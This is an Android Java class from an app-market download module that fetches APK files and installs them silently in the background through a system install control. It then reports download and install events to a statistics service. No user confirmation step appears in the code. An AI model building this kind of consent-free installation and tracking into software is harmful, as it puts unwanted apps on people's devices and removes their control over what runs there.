package com.market.download.silent;

import android.content.Context;

import com.market.download.common.DownBaseTask;
import com.market.download.common.InstallControl;
import com.market.download.common.SilentInstallTask;
import com.market.download.util.Util;
import com.market.statistics.ReportManager;

/**
 * silent download apk and install it silent
 * @author Athlon
 *
 */
public class SilentDownEventTask extends DownBaseTask {
	private static final String TAG = "SilentDownEventTask";
	
	private SilentDownEventInfo mDownInfo;
	private TaskCallback mCallback;
	
	public SilentDownEventTask(Context context, TaskCallback callback, SilentDownEventInfo downInfo) {
		super(context, downInfo);
		mDownInfo = downInfo;
		mCallback = callback;
	}
	

	@Override
	protected void run() {
		if (Util.isAppExistInHandsetNow(mContext, mDownInfo.getPkgName())) {
			mCallback.removeSilentInfo(mDownInfo);
			return;
		}
		
		if (mDownInfo.getApkFile().exists()) {
		    silentInstallEvent();
			return;
		}
		
		super.run();
	}
	
	
	private void reportDownloadResult() {
        ReportManager rm = ReportManager.getInstance(mContext);
        rm.reportDownloadResult(mDownInfo.getFromFlag(),
                                mDownInfo.getTopicId(),
                                mDownInfo.getAppName(),
                                mDownInfo.getPkgName(),
                                Integer.toString(mDownInfo.getAppId()),
                                mDownInfo.getVersionCode());
    }
    
    
    private void reportInstallResult() {
        ReportManager rm = ReportManager.getInstance(mContext);
        rm.reportInstallResult(mDownInfo.getFromFlag(),
                               mDownInfo.getTopicId(),
                               mDownInfo.getAppName(),
                               mDownInfo.getPkgName(),
                               Integer.toString(mDownInfo.getAppId()),
                               mDownInfo.getVersionCode());
    }


	@Override
	public void taskInvalidated() {
		// TODO Auto-generated method stub

	}

	@Override
	public void fileTotalSizeGet() {
		// TODO Auto-generated method stub

	}

	@Override
	public void noEnoughSpaceOnSdcard() {
		// TODO Auto-generated method stub

	}

	@Override
	public void sdcardHasLost() {
		// TODO Auto-generated method stub

	}

	@Override
	public void fileNotFoundOnHttpServer() {
		// TODO Auto-generated method stub

	}

	@Override
	public void downloadThreadInterrupted() {
		// TODO Auto-generated method stub

	}

	@Override
	public void downloadProgressChanged() {
		// TODO Auto-generated method stub

	}

	@Override
	public void downloadApkSuccess() {
	    reportDownloadResult();
	    
	    silentInstallEvent();
	}

	@Override
	public void pausedByUser() {
		// TODO Auto-generated method stub

	}

	@Override
	public void canceledByUser() {
		// TODO Auto-generated method stub

	}

	
	private void silentInstallEvent() {
	    String pkgName = mDownInfo.getPkgName();
        if (!Util.isAppExistInHandsetNow(mContext, pkgName)) {
            Util.log(TAG, "downloadApkSuccess", "start to install app: " + pkgName);
            mDownInfo.downloadComplete();
            if (!Util.isApkFileUsable(mContext, mDownInfo.getApkFile(), mDownInfo.getVersionCode())) {
                mDownInfo.getApkFile().delete();
                return;
            }
            reportDownloadResult();
            InstallControl instalControl = InstallControl.getControl();
            instalControl.silentInstall(mContext,
                                        mDownInfo.getApkFile(),
                                        new SilentInstallTask.InstallCallback() {
                @Override
                public void installSuccess() {
                    mDownInfo.eventInstalled();
                    mCallback.saveSilentInfo(mDownInfo);
                    reportInstallResult();
                }

                @Override
                public void installFailed() { }

                @Override
                public void hasInstalledYet() { }
            });
            
//            if (Util.backgroundInstallAPK(mContext, mDownInfo.getApkFile())) {
//                mDownInfo.eventInstalled();
//                mCallback.saveSilentInfo(mDownInfo);
//                reportInstallResult();
//            }
        } else {
            Util.log(TAG, "downloadApkSuccess", pkgName + " has been installed, do not install it again");
            mCallback.removeSilentInfo(mDownInfo);
        }
	}
	
	
	public interface TaskCallback {
        void removeSilentInfo(SilentDownEventInfo silentInfo);
        void saveSilentInfo(SilentDownEventInfo silentInfo);
    }
}
